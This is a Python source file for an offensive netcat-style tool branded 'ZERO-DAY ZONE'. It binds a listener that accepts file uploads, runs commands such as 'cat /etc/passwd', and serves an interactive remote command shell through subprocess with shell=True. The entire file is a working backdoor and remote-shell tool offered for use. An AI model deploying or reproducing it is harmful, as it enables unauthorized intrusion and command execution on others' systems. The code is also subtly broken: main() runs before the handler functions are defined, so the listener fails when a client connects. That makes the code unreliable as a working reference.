import socket
import sys
import getopt
import threading
import subprocess

# define global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("+[+[+[ The ZERO-DAY ZONE Net Tool ]+]+]+ ")
    print("+[+[+[ ********************************** ]+]+]+ ")
    print("Usage: Zonecat.py -t target_host -p port")
    print("""
-l --listen - listen on [host]:[port] for
              incoming connections""")
    print("""
-e --execute=file_to_run - execute the given file upon
                           receiving A connection""")
    print("-c --command - initialize a command shell")
    print("""
-u --upload=destination - upon receiving connection upload a
                          file and write to[destination]""")
    print("#############################################################")
    print("+[+[+[ Examples: ]+]+]+ ")
    print("Zonecat.py -t 192.168.0.1 -p 5555 -l -c")
    print("Zonecat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print('Zonecat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"')
    print("echo 'ABCDEFGHI' | ./Zonecat.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to our target host
        client.connect((target, port))

        if buffer:
            client.send(buffer.encode())

        while True:
            # Now wait for data back
            response = b""
            while True:
                data = client.recv(4096)
                if not data:
                    break
                response += data

            print(response.decode(), end='')

            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode())
    except Exception as e:
        print(f"[*] Exception: {str(e)}. Exiting.")
    finally:
        # Tear down the connection
        client.close()


def server_loop():
    global target

    try:
        # If no target is defined, listen on all interfaces
        if not target:
            target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target, port))
        server.listen(5)

        print(f"[*] Listening on {target}:{port}")

        while True:
            client_socket, addr = server.accept()

            # Spin up a new thread to handle the client
            client_thread = threading.Thread(target=client_handler, args=(client_socket,))
            client_thread.start()

    except Exception as e:
        print(f"[*] Exception: {str(e)}")
        # Close the server socket on error
        server.close()


def main():
    global listen
    global command
    global port
    global execute
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as e:
        print(f"error : {e}")
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
    # are we going to listen or just send data from stdin?

    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)
    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()


main()


def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # Check if upload destination is provided
    if upload_destination:
        # Read in all the bytes and write to the destination
        file_buffer = b""

        # Keep reading data until no more data is available or connection is closed
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data

        # Write the received data to the upload destination
        try:
            with open(upload_destination, 'wb') as f:
                f.write(file_buffer)
            # f.close()
            client_socket.send(f"Successfully saved file to {upload_destination}".encode())
        except Exception as e:
            client_socket.send(f"Failed to save file to {upload_destination}: {str(e)}".encode())

    # Check if command execution is requested
    if execute:
        # Run the command
        output = run_command(execute)
        client_socket.send(output)

    # If a command shell is requested, then execute commands and return output
    if command:
        while True:
            # Display a simple prompt
            client_socket.send(b"<ZDZ: #> ")
            # Receive until newline character is encountered
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # Execute the command
            response = run_command(cmd_buffer.decode())

            # Send the command output back to the client
            client_socket.send(response)
